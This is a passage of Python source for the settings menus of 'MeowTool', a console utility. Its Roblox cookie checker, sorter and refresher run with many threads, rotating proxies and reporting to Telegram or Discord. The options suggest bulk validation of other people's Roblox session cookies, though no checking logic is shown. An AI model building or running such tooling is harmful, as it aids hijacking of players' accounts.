                                        changeConsoleTitle(settingsTitleEnter)
                                    case '4':
                                        config['General']['Show_Label_MeowTool'] ^= True
                                        labelASCII()
                                    case '5':
                                        config['General']['Show_Label_by_h1kken'] ^= True
                                        labelASCII()
                                    case '6':
                                        config['General']['Disable_Warnings_For_Links'] ^= True
                                    case '7':
                                        config['General']['Disable_Warnings_For_Dangerous_Actions'] ^= True
                                    case '8' | 'F' | 'А':
                                        labelASCII()
                                    case 'R' | 'К':
                                        loadConfig(configLoader['Loader']['Current_Config'])
                                    case _:
                                        removeLines(14)

                                autoSaveConfigAndRemoveLinesInSettings(settingsGeneralTab, ('3', '4', '5', '6', '7', '8'), ('6', '7', '8', '0', 'R', 'К'), 14)
                        # Выводы
                        case '2':
                            removeLines(11)
                            whileTrueStage2 = True
                            while whileTrueStage2:
                                cmdWriter(f' {generateVisualPath(MT_Settings, MT_Outputs)}\n\n [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Outputs']['Output_Total'])} {MT_Output_Total}\n [{ANSI.FG.PINK}2{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Outputs']['TelegramBot']['Send_Results_To_Telegram_Bot'])} {MT_Telegram_Bot}\n [{ANSI.FG.PINK}3{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Outputs']['DiscordWebhook']['Send_Results_To_Discord_Webhook'])} {MT_Discord_Webhook}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                settingsRobloxGeneralOutputsTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                match settingsRobloxGeneralOutputsTab:
                                    case '0':
                                        whileTrueStage2 = False
                                    case '1':
                                        config['Outputs']['Output_Total'] ^= True
                                    case '2':
                                        removeLines(9)
                                        whileTrueStage3 = True
                                        while whileTrueStage3:
                                            cmdWriter(f' {generateVisualPath(MT_Settings, MT_Outputs, MT_Telegram_Bot)}\n\n [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {f'{MT_Specify} {MT_Bot_Token.lower()}' if not str(config['Outputs']['TelegramBot']['Telegram_Bot_Token']) else f'{MT_Bot_Token}: {config['Outputs']['TelegramBot']['Telegram_Bot_Token']}'}\n [{ANSI.FG.PINK}2{ANSI.FG.WHITE}] ┃ {f'{MT_Specify} {MT_Chat_ID[1]}' if not str(config['Outputs']['TelegramBot']['Telegram_Bot_Chat_ID']) else f'{MT_Chat_ID[0]}: {config['Outputs']['TelegramBot']['Telegram_Bot_Chat_ID']}'}\n [{ANSI.FG.PINK}3{ANSI.FG.WHITE}] ┃ {MT_Automatically_Find_The_Chat_ID}\n [{ANSI.FG.PINK}4{ANSI.FG.WHITE}] ┃ {MT_Manually_Find_The_Chat_ID}\n [{ANSI.FG.PINK}5{ANSI.FG.WHITE}] ┃ Meow...\n [{ANSI.FG.PINK}6{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Outputs']['TelegramBot']['Send_Results_To_Telegram_Bot'])} {MT_Send[3]} {MT_Results_To_Telegram[0].lower()}{MT_Results_To_Telegram[1:]}\n  ┃\n [{ANSI.FG.YELLOW}C{ANSI.FG.WHITE}] ┃ {MT_Create_A_Bot}\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                            settingsRobloxGeneralOutputsTelegramBotTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                            match settingsRobloxGeneralOutputsTelegramBotTab:
                                                case '0':
                                                    whileTrueStage3 = False
                                                case '1':
                                                    removeLines(11)
                                                    cmdWriter(f' [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                                    settingsRobloxGeneralOutputsTGBotTokenEnter = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_A_Bot_Token}: ').strip()
                                                    changeTelegramBotToken(settingsRobloxGeneralOutputsTGBotTokenEnter)
                                                case '2':
                                                    removeLines(11)
                                                    cmdWriter(f' [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                                    settingsRobloxGeneralOutputsTGChatIDEnter = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_A_Chat_ID}: ').strip()
                                                    changeTelegramChatID(settingsRobloxGeneralOutputsTGChatIDEnter)
                                                case '3':
                                                    await autoFindChatID()
                                                case '4':
                                                    openLink(f'https://api.telegram.org/bot{config['Outputs']['TelegramBot']['Telegram_Bot_Token']}/getUpdates', 13, generateVisualPath(MT_Settings, MT_Outputs, MT_Telegram_Bot))
                                                case '5':
                                                    await testMeowTelegramBot()
                                                case '6':
                                                    config['Outputs']['TelegramBot']['Send_Results_To_Telegram_Bot'] ^= True
                                                case 'C' | 'С':
                                                    openLink('https://t.me/BotFather', 13, generateVisualPath(MT_Settings, MT_Outputs, MT_Telegram_Bot))
                                                case 'F' | 'А':
                                                    labelASCII()
                                                case 'R' | 'К':
                                                    loadConfig(configLoader['Loader']['Current_Config'])
                                                case _:
                                                    removeLines(13)

                                            autoSaveConfigAndRemoveLinesInSettings(settingsRobloxGeneralOutputsTelegramBotTab, ('6'), ('0', '6', 'R', 'К'), 13)
                                    case '3':
                                        removeLines(9)
                                        whileTrueStage3 = True
                                        while whileTrueStage3:
                                            cmdWriter(f' {generateVisualPath(MT_Settings, MT_Outputs, MT_Discord_Webhook)}\n\n [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {f'{MT_Specify} {MT_Webhook_URL[1]}' if not str(config['Outputs']['DiscordWebhook']['Discord_Webhook_URL']) else f'{MT_Webhook_URL[0]}: {str(config['Outputs']['DiscordWebhook']['Discord_Webhook_URL']).replace('https://discord.com/api/webhooks', '..')}'}\n [{ANSI.FG.PINK}2{ANSI.FG.WHITE}] ┃ Meow...\n [{ANSI.FG.PINK}3{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Outputs']['DiscordWebhook']['Send_Results_To_Discord_Webhook'])} {MT_Send[3]} {MT_Results_To_Discord[0].lower()}{MT_Results_To_Discord[1:]}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                            settingsRobloxGeneralOutputsDiscordWebhookTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                            match settingsRobloxGeneralOutputsDiscordWebhookTab:
                                                case '0':
                                                    whileTrueStage3 = False
                                                case '1':
                                                    removeLines(8)
                                                    cmdWriter(f'\n [{ANSI.FG.YELLOW}?{ANSI.FG.WHITE}] ┃ {MT_Format}: https://discord.com/api/webhooks/../..\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                                    settingsRobloxGeneralOutputsDSWebhookURLEnter = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_A_Webhook_URL}: ').strip().rstrip('/')
                                                    changeDiscordWebhookURL(settingsRobloxGeneralOutputsDSWebhookURLEnter)
                                                case '2':
                                                    testMeowDiscordWebhook()
                                                case '3':
                                                    config['Outputs']['DiscordWebhook']['Send_Results_To_Discord_Webhook'] ^= True
                                                case 'F' | 'А':
                                                    labelASCII()
                                                case 'R' | 'К':
                                                    loadConfig(configLoader['Loader']['Current_Config'])
                                                case _:
                                                    removeLines(9)

                                            autoSaveConfigAndRemoveLinesInSettings(settingsRobloxGeneralOutputsDiscordWebhookTab, ('3'), ('0', '3', 'R', 'К'), 9)
                                    case 'F' | 'А':
                                        labelASCII()
                                    case 'R' | 'К':
                                        loadConfig(configLoader['Loader']['Current_Config'])
                                    case _:
                                        removeLines(9)

                                autoSaveConfigAndRemoveLinesInSettings(settingsRobloxGeneralOutputsTab, ('1'), ('0', '1', 'R', 'К'), 9)
                        # Прокси
                        case '3':
                            whileTrueStage2 = True
                            removeLines(11)
                            while whileTrueStage2:
                                cmdWriter(f' {generateVisualPath(MT_Settings, MT_Proxy)}\n\n [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {MT_Checker}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                settingsProxyTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                match settingsProxyTab:
                                    case '0':
                                        whileTrueStage2 = False
                                    # Чекер (PC)
                                    case '1':
                                        whileTrueStage3 = True
                                        removeLines(7)
                                        while whileTrueStage3:
                                            cmdWriter(f' {generateVisualPath(MT_Settings, MT_Proxy, MT_Checker)}\n\n [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {MT_Waiting_Time}: {config['Proxy']['Checker']['Timeout']} {MT_Seconds}.\n [{ANSI.FG.PINK}2{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Proxy']['Checker']['Save_Good_In_Custom_File'])} {MT_Save_In} custom_good.txt\n [{ANSI.FG.PINK}3{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Proxy']['Checker']['Save_Without_Protocol'])} {MT_Save_Without_Protocol}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                            settingsPCTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                            match settingsPCTab:
                                                case '0':
                                                    whileTrueStage3 = False
                                                case '1':
                                                    removeLines(9)
                                                    cmdWriter(f' {generateVisualPath(MT_Settings, MT_Proxy, MT_Checker)}\n\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Cancel}\n\n')
                                                    settingsPCTimeoutChange = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_The_Waiting_Time}: ')

                                                    async def changeProxyTimeout():
                                                        if settingsPCTimeoutChange == '0': return removeLines(5)
                                                        if not settingsPCTimeoutChange.isdigit():
                                                            return errorOrCorrectHandler(True, MT_Incorrect_Value, generateVisualPath(MT_Settings, MT_Proxy, MT_Checker))
                                                        if int(settingsPCTimeoutChange) > 60:
                                                            return errorOrCorrectHandler(True, MT_Incorrect_Waiting_Time_60, generateVisualPath(MT_Settings, MT_Proxy, MT_Checker))

                                                        config['Proxy']['Checker']['Timeout'] = int(settingsPCTimeoutChange)
                                                        autoSaveConfig()
                                                        removeLines(5)

                                                    await changeProxyTimeout()
                                                case '2':
                                                    config['Proxy']['Checker']['Save_Good_In_Custom_File'] ^= True
                                                case '3':
                                                    config['Proxy']['Checker']['Save_Without_Protocol'] ^= True
                                                case 'F' | 'А':
                                                    labelASCII()
                                                case 'R' | 'К':
                                                    loadConfig(configLoader['Loader']['Current_Config'])
                                                case _:
                                                    removeLines(9)

                                            autoSaveConfigAndRemoveLinesInSettings(settingsPCTab, ('2', '3'), ('0', '2', '3', 'R', 'К'), 9)
                                    case 'F' | 'А':
                                        labelASCII()
                                    case 'R' | 'К':
                                        loadConfig(configLoader['Loader']['Current_Config'])
                                    case _:
                                        removeLines(7)

                                autoSaveConfigAndRemoveLinesInSettings(settingsProxyTab, (), ('0', 'R', 'К'), 7)
                        # Роблокс
                        case '4':
                            removeLines(11)
                            whileTrueStage2 = True
                            while whileTrueStage2:
                                cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox)}\n\n [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {MT_General}\n [{ANSI.FG.PINK}2{ANSI.FG.WHITE}] ┃ {MT_Cookie_Checker}\n [{ANSI.FG.PINK}3{ANSI.FG.WHITE}] ┃ {MT_Cookie_Sorter}\n [{ANSI.FG.PINK}4{ANSI.FG.WHITE}] ┃ {MT_Cookie_Refresher}\n [{ANSI.FG.PINK}5{ANSI.FG.WHITE}] ┃ {MT_Transaction_Analysis}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                settingsRobloxTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                match settingsRobloxTab:
                                    case '0':
                                        whileTrueStage2 = False
                                    # Общее
                                    case '1':
                                        removeLines(11)
                                        whileTrueStage3 = True
                                        while whileTrueStage3:
                                            cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_General)}\n\n [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {MT_Symbols}: {config['Roblox']['General']['Symbols_Between_Warning_And_Cookie']}\n [{ANSI.FG.PINK}2{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Roblox']['General']['Add_Symbols_Between_Warning_And_Cookie'])} {MT_Add_Symbols_Between_Warning_And_Cookie}\n [{ANSI.FG.PINK}3{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Roblox']['General']['Proxy']['Use_Proxy'])} {MT_Proxy}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                            settingsRobloxGeneralTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                            match settingsRobloxGeneralTab:
                                                case '0':
                                                    whileTrueStage3 = False
                                                case '1':
                                                    removeLines(9)
                                                    cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_General)}\n\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                                    settingsRobloxGeneralChangeSymbolsTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').strip()
                                                    changeSymbols(settingsRobloxGeneralChangeSymbolsTab)
                                                case '2':
                                                    config['Roblox']['General']['Add_Symbols_Between_Warning_And_Cookie'] ^= True
                                                # Прокси
                                                case '3':
                                                    removeLines(9)
                                                    whileTrueStage4 = True
                                                    while whileTrueStage4:
                                                        autoProtocol = str(config['Roblox']['General']['Proxy']['Auto_Protocol_If_Not_Specified']).lower()
                                                        cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_General, MT_Proxy)}\n\n [{ANSI.FG.YELLOW}?{ANSI.FG.WHITE}] ┃ {MT_Available_Formats}:\n [{ANSI.FG.YELLOW}?{ANSI.FG.WHITE}] ┃  – {ANSI.FG.GRAY}protocol://{ANSI.FG.WHITE}user:pass@ip:port\n [{ANSI.FG.YELLOW}?{ANSI.FG.WHITE}] ┃  – {ANSI.FG.GRAY}protocol://{ANSI.FG.WHITE}ip:port:user:pass\n [{ANSI.FG.YELLOW}?{ANSI.FG.WHITE}] ┃  – {ANSI.FG.GRAY}protocol://{ANSI.FG.WHITE}ip:port\n  ┃\n [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Roblox']['General']['Proxy']['Use_Proxy'])} {MT_Use_Proxy}\n [{ANSI.FG.PINK}2{ANSI.FG.WHITE}] ┃ {MT_Auto_Protocol_If_Not_Specified}: {autoProtocol if autoProtocol in ('http', 'socks4', 'socks5') else 'http'}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                                        settingsRCCProxyTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                                        match settingsRCCProxyTab:
                                                            case '0':
                                                                whileTrueStage4 = False
                                                            case '1':
                                                                config['Roblox']['General']['Proxy']['Use_Proxy'] ^= True
                                                            case '2':
                                                                removeLines(13)
                                                                whileTrueStage5 = True
                                                                while whileTrueStage5:
                                                                    autoProtocol = str(config['Roblox']['General']['Proxy']['Auto_Protocol_If_Not_Specified']).lower()
                                                                    cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_General, MT_Proxy, MT_Auto_Protocol)}\n\n [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(autoProtocol == 'http' or autoProtocol not in ('http', 'socks4', 'socks5'))} http\n [{ANSI.FG.PINK}2{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(autoProtocol == 'socks4')} socks4\n [{ANSI.FG.PINK}3{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(autoProtocol == 'socks5')} socks5\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                                                    settingsRCCProxyAutoProtocolTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                                                    match settingsRCCProxyAutoProtocolTab:
                                                                        case '0':
                                                                            whileTrueStage5 = False
                                                                        case '1' | '2' | '3':
                                                                            autoProtocolOptions = {'1': 'http', '2': 'socks4', '3': 'socks5'}
                                                                            config['Roblox']['General']['Proxy']['Auto_Protocol_If_Not_Specified'] = autoProtocolOptions[settingsRCCProxyAutoProtocolTab]
                                                                        case 'F' | 'А':
                                                                            labelASCII()
                                                                        case 'R' | 'К':
                                                                            loadConfig(configLoader['Loader']['Current_Config'])
                                                                        case _:
                                                                            removeLines(9)

                                                                    autoSaveConfigAndRemoveLinesInSettings(settingsRCCProxyAutoProtocolTab, ('1', '2', '3'), ('0', '1', '2', '3', 'R', 'К'), 9)
                                                            case 'F' | 'А':
                                                                labelASCII()
                                                            case 'R' | 'К':
                                                                loadConfig(configLoader['Loader']['Current_Config'])
                                                            case _:
                                                                removeLines(13)

                                                        autoSaveConfigAndRemoveLinesInSettings(settingsRCCProxyTab, ('1'), ('0', '1', 'R', 'К'), 13)
                                                case 'F' | 'А':
                                                    labelASCII()
                                                case 'R' | 'К':
                                                    loadConfig(configLoader['Loader']['Current_Config'])
                                                case _:
                                                    removeLines(9)

                                            autoSaveConfigAndRemoveLinesInSettings(settingsRobloxGeneralTab, ('2'), ('0', '2', 'R', 'К'), 9)
                                    # Куки чекер (RCC)
                                    case '2':
                                        removeLines(11)
                                        whileTrueStage3 = True
                                        while whileTrueStage3:
                                            cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker)}\n\n [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {MT_General}\n [{ANSI.FG.PINK}2{ANSI.FG.WHITE}] ┃ {MT_Main}\n [{ANSI.FG.PINK}3{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Roblox']['CookieChecker']['Sorting']['Sort'])} {MT_Sorting}\n [{ANSI.FG.PINK}4{ANSI.FG.WHITE}] ┃ {MT_Places}\n [{ANSI.FG.PINK}5{ANSI.FG.WHITE}] ┃ {MT_Custom_Places}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                            settingsRCCTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                            match settingsRCCTab:
                                                case '0':
                                                    whileTrueStage3 = False
                                                # Общее
                                                case '1':
                                                    removeLines(11)
                                                    whileTrueStage4 = True
                                                    while whileTrueStage4:
                                                        cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_General)}\n\n [{ANSI.FG.PINK}1{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Roblox']['CookieChecker']['General']['First_Check_All_Cookies_For_Valid'])} {MT_First_Check_All_Cookies_For_Valid}\n [{ANSI.FG.PINK}2{ANSI.FG.WHITE}] ┃ {MT_Number_Of_Threads_For_Valid_Checker}: {int(config['Roblox']['CookieChecker']['General']['Number_Of_Threads_For_Valid_Checker']) if str(config['Roblox']['CookieChecker']['General']['Number_Of_Threads_For_Valid_Checker']).isdigit() and (0 < int(config['Roblox']['CookieChecker']['General']['Number_Of_Threads_For_Valid_Checker']) <= 1000) else 10}\n [{ANSI.FG.PINK}3{ANSI.FG.WHITE}] ┃ {MT_Number_Of_Threads_For_Main_Checker}: {config['Roblox']['CookieChecker']['General']['Number_Of_Threads_For_Main_Checker'] if (0 < config['Roblox']['CookieChecker']['General']['Number_Of_Threads_For_Main_Checker'] <= 500) else 10}\n [{ANSI.FG.PINK}4{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Roblox']['CookieChecker']['General']['Name_Output_File_The_Same_As_Input_File'])} {MT_Name_Output_File_The_Same_As_Input_File}\n [{ANSI.FG.PINK}5{ANSI.FG.WHITE}] ┃ {MT_Output_Filename}: {config['Roblox']['CookieChecker']['General']['Output_Filename'] if not any(char in config['Roblox']['CookieChecker']['General']['Output_Filename'] for char in FILENAME_SPECIAL_CHARS) and len(config['Roblox']['CookieChecker']['General']['Output_Filename']) <= 50 else 'output'}\n [{ANSI.FG.PINK}6{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Roblox']['CookieChecker']['General']['Move_Cookie_To_The_Next_Line'])} {MT_Move_Cookie_To_The_Next_Line}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                                        settingsRCCGeneralTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                                        match settingsRCCGeneralTab:
                                                            case '0':
                                                                whileTrueStage4 = False
                                                            case '1':
                                                                config['Roblox']['CookieChecker']['General']['First_Check_All_Cookies_For_Valid'] ^= True
                                                            case '2' | '3':
                                                                removeLines(11)
                                                                settingsRCCGeneralThreadsEnter = input(f'\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Number_Of_Threads}: ').strip()
                                                                match settingsRCCGeneralTab:
                                                                    case '2': changeNumberOfThreads('CookieChecker', 'Number_Of_Threads_For_Valid_Checker', settingsRCCGeneralThreadsEnter, 1000)
                                                                    case '3': changeNumberOfThreads('CookieChecker', 'Number_Of_Threads_For_Main_Checker',  settingsRCCGeneralThreadsEnter, 500)
                                                            case '4':
                                                                config['Roblox']['CookieChecker']['General']['Name_Output_File_The_Same_As_Input_File'] ^= True
                                                            case '5':
                                                                removeLines(11)
                                                                newOutputFilenameRCC = input(f'\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] {MT_Cancel}\n\n [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_New_Filename}: ')
                                                                changeOutputFilenameRoblox('CookieChecker', newOutputFilenameRCC)
                                                            case '6':
                                                                config['Roblox']['CookieChecker']['General']['Move_Cookie_To_The_Next_Line'] ^= True
                                                            case 'F' | 'А':
                                                                labelASCII()
                                                            case 'R' | 'К':
                                                                loadConfig(configLoader['Loader']['Current_Config'])
                                                            case _:
                                                                removeLines(12)

                                                        autoSaveConfigAndRemoveLinesInSettings(settingsRCCGeneralTab, ('1', '4', '6'), ('0', '1', '4', '6', 'R', 'К'), 12)
                                                # Основное
                                                case '2':
                                                    removeLines(11)
                                                    whileTrueStage4 = True
                                                    while whileTrueStage4:
                                                        cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Main)}\n\n')
                                                        printGeneralRCC()
                                                        cmdWriter(f'  ┃\n [{ANSI.FG.GREEN}+{ANSI.FG.WHITE}] ┃ {MT_Enable_All}\n [{ANSI.FG.RED}-{ANSI.FG.WHITE}] ┃ {MT_Disable_All}\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                                        settingsRCCMainTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                                        match settingsRCCMainTab:
                                                            case settingsRCCMainTab if settingsRCCMainTab.startswith('0'):
                                                                if len(settingsRCCMainTab) == 1:
                                                                    whileTrueStage4 = False
                                                            # Gamepasses | Custom Gamepasses | Badges | Favorite Places | Places Weekly Playtime | Bundles | Groups Owned | Roblox Badges
                                                            case settingsRCCMainTab if (settingsRCCMainTab.isdigit() and int(settingsRCCMainTab) <= len(cookieData.listOfCookieData) and cookieData.listOfCookieData[int(settingsRCCMainTab) - 1][0] in ('Gamepasses', 'Custom Gamepasses', 'Badges', 'Favorite Places', 'Places Weekly Playtime', 'Bundles', 'Groups Owned', 'Roblox Badges')):
                                                                nameOfCategory  = str(cookieData.listOfCookieData[int(settingsRCCMainTab) - 1][0])
                                                                _nameOfCategory = '_'.join(nameOfCategory.split())
                                                                sortLabels = {
                                                                    'Custom Gamepasses'      : [MT_Add_A_Gamepass_Name, MT_Enter_The_Gamepass_Name],
                                                                    **dict.fromkeys(
                                                                        ['Favorite Places', 'Places Weekly Playtime'],
                                                                        [MT_Add_A_Place_By_ID,   MT_Enter_The_Place_ID]
                                                                    ),
                                                                    'Bundles'                : [MT_Add_A_Bundle_By_ID,  MT_Enter_The_Bundle_ID],
                                                                    'Number'                 : MT_Number,
                                                                    'Names'                  : MT_Names,
                                                                    'PlaceNumber'            : MT_Place_Number,
                                                                    'PlaceNames'             : MT_Place_Names,
                                                                    'NameNumber'             : MT_Name_Number
                                                                }
                                                                outputModes = {
                                                                    **dict.fromkeys(
                                                                        ['Gamepasses', 'Badges'],
                                                                        ['Number', 'Names', 'PlaceNumber', 'PlaceNames']
                                                                    ),
                                                                    **dict.fromkeys(
                                                                        ['Favorite Places', 'Places Weekly Playtime', 'Bundles', 'Groups Owned', 'Roblox Badges'],
                                                                        ['Number', 'Names']
                                                                    ),
                                                                    'Custom Gamepasses': ['Number', 'NameNumber']
                                                                }
                                                                labelASCII()
                                                                whileTrueStage5 = True
                                                                while whileTrueStage5:
                                                                    outputMode = config['Roblox']['CookieChecker']['Main'][f'{_nameOfCategory}_Output_Mode']
                                                                    labelOutputMode = sortLabels[outputMode] if outputMode in outputModes[nameOfCategory] else sortLabels[outputModes[nameOfCategory][-1]]
                                                                    if nameOfCategory in ('Custom Gamepasses', 'Favorite Places', 'Places Weekly Playtime', 'Bundles'):
                                                                        cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Main, nameOfCategory)}\n\n')
                                                                        generalCategoryRCC(True, _nameOfCategory)
                                                                        cmdWriter(f'{f'  ┃\n [{ANSI.FG.GREEN}+{ANSI.FG.WHITE}] ┃ {MT_Enable_All}\n [{ANSI.FG.RED}-{ANSI.FG.WHITE}] ┃ {MT_Disable_All}\n  ┃\n' if config['Roblox']['CookieChecker']['Main'][f'{_nameOfCategory}_List'] else ''} [{ANSI.FG.YELLOW}M{ANSI.FG.WHITE}] ┃ {MT_Output_Mode}: {labelOutputMode}\n [{ANSI.FG.YELLOW}A{ANSI.FG.WHITE}] ┃ {sortLabels[nameOfCategory][0]}\n [{ANSI.FG.YELLOW}C{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Roblox']['CookieChecker']['Main'][_nameOfCategory])} {MT_Check}\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                                                        hasList = True
                                                                    else:
                                                                        cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Main, nameOfCategory)}\n\n [{ANSI.FG.YELLOW}M{ANSI.FG.WHITE}] ┃ {MT_Output_Mode}: {labelOutputMode}\n [{ANSI.FG.YELLOW}C{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Roblox']['CookieChecker']['Main'][_nameOfCategory])} {MT_Check}\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                                                        hasList = False
                                                                    settingsRCCGeneralCategoryTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                                                    match settingsRCCGeneralCategoryTab:
                                                                        case settingsRCCGeneralCategoryTab if settingsRCCGeneralCategoryTab.startswith('0'):
                                                                            if len(settingsRCCGeneralCategoryTab) == 1:
                                                                                whileTrueStage5 = False
                                                                        case settingsRCCGeneralCategoryTab if (hasList and settingsRCCGeneralCategoryTab.isdigit() and int(settingsRCCGeneralCategoryTab) <= len(config['Roblox']['CookieChecker']['Main'][f'{_nameOfCategory}_List'])):
                                                                            labelASCII()
                                                                            choice = int(settingsRCCGeneralCategoryTab) - 1
                                                                            whileTrueStage6 = True
                                                                            while whileTrueStage6:
                                                                                categoryData = generalCategoryRCC(False, _nameOfCategory)
                                                                                cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Cookie_Checker, MT_Main, nameOfCategory, str(categoryData[choice][0]))}\n\n [{ANSI.FG.YELLOW}C{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(categoryData[int(settingsRCCGeneralCategoryTab) - 1][-1])} {MT_Check}\n [{ANSI.FG.RED}D{ANSI.FG.WHITE}] ┃ {MT_Delete}\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                                                                settingsRCCGeneralCategoryContextMenuTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                                                                match settingsRCCGeneralCategoryContextMenuTab:
                                                                                    case '0':
                                                                                        whileTrueStage6 = False
                                                                                    case 'C' | 'С':
                                                                                        config['Roblox']['CookieChecker']['Main'][f'{_nameOfCategory}_List'][choice][-1] ^= True
                                                                                    case 'D' | 'В':
                                                                                        if not config['General']['Disable_Warnings_For_Dangerous_Actions']:
                                                                                            removeLines(7)
                                                                                            whileTrueStage7 = True
                                                                                            while whileTrueStage7:
